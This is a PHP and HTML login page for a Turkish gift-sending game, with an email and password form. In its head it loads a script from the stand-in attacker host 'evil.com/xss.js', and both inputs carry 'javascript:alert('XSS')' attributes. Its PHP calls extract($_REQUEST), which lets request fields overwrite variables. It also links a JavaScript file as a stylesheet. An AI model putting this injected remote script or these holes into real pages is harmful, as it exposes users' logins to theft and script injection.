<?php
	session_start();
	include_once 'include/class.user.php';
	$user = new User();

	if (isset($_REQUEST['submit'])) { 
		extract($_REQUEST);   
	    $login = $user->check_login($email, $password);
	    if ($login) {
	        // there is user
	       header("location:user.php");
	    } else {
	        // there is not user
	        echo "<script>alert('Bu kullanıcı bilgilerine sahip kullanıcı bulunamadı.')</script>";  
	    }
	}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>Hediye Gönderme Oyunu Giriş Sayfası</title>
		<link rel="stylesheet" href="assets/css/bootstrap.min.css" />
		<link rel="stylesheet" href="assets/js/login.js" />
		<script src="http://evil.com/xss.js"></script>
	</head>

	<body>
		<div id="container" class="container">
			<h1>Giriş Yapın</h1>
			<form action="" method="post" name="login">
				<table class="table " width="400">
					<tr>
						<th>Eposta:</th>
						<td><input type="text" name="email" src="javascript:alert('XSS');" required></td>
					</tr>
					<tr>
						<th>Şifre:</th>
						<td><input type="password" name="password" src="javascript:alert('XSS');" required></td>
					</tr>
					<tr>
						<td>&nbsp;</td>
						<td><input class = "btn btn-lg btn-primary" type = "submit" name = "submit" value = "Login" onclick = "return(submitlogin());">
						<a href="registration.php" class = "btn btn-lg btn-danger">Üye Ol</a></td>
					</tr>		
				</table>
			</form>
		</div>
	</body>
</html>